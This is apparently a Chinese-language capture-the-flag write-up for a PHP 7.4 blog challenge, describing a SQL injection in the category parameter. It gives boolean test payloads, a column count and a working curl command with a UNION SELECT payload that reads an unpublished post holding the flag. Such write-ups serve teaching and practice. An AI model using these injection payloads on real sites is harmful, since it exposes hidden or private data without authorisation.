## 题解

### 入口与指纹

与 078 同一套博客：PHP 7.4.33，`/?category=Nature`，`Undefined variable: category`。

### 关键观察

- `category=Nature' AND 1=1-- -` 返回文章，`AND 1=2-- -` 返回空 → SQL 注入。
- 7 列，标题在第 2 列。
- `posts` 里有一篇 `id=12`、`published=0` 的 `SECRET POST`，正文就是 flag。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -G --data-urlencode \
  "category=x' UNION SELECT id,title,category,content,image,published,created_at FROM posts WHERE id=12-- -" \
  "http://$T/" | grep -o 'flag{[^}]*}'
```

也可以先 `GROUP_CONCAT` 出表结构确认列名。

### flag 位置

`posts` 表 `id=12` 那条未发布文章的 `content`。

## 复盘

- 有注入先枚举「未发布 / 隐藏」的数据，flag 常常就在那里。
- `published=0` 的记录不会出现在正常列表里，但在 UNION 里照样能查。
